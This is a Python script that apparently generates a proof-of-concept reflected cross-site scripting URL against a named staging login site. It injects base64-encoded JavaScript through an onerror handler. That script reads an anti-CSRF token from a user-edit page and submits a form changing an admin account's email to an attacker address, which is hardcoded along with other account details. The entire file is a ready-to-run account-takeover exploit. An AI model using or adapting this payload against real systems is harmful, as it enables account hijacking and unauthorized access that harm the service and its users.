from base64 import b64encode
from urllib.parse import quote

attacker_email = "akberbadsha05@gmail.com"
payload = """var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/users/details/503/edit', true);
req.send();

function handleResponse() {
    var parser = new DOMParser();
    var doc = parser.parseFromString(this.responseText, 'text/html');
    var token = doc.querySelector('input[name="__RequestVerificationToken"]').value;
    console.log(token);
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/users/details/503/edit', true);
    changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
changeReq.send('ViewModel.Id=503&ViewModel.UserName=admin.montagne&ViewModel.CompanyLabel=Hotel+Montagne+SFPMEI&ViewModel.FirstName=admin&ViewModel.LastName=montagne&ViewModel.Email=attacker_email&ViewModel.PhoneNumber=0000000000&ViewModel.Culture=en&ViewModel.NewsletterSubscribed=false&__RequestVerificationToken=' + token);
};
""".replace('attacker_email', quote(attacker_email))

url = f"https://login.staging.col.thunes.com/users/details/503?successMessage=xss%22%3E%3Cimg%20src%3dx%20onerror%3deval(atob(%27{quote(b64encode(payload.encode()).decode())}%27))%3E"
print(url)
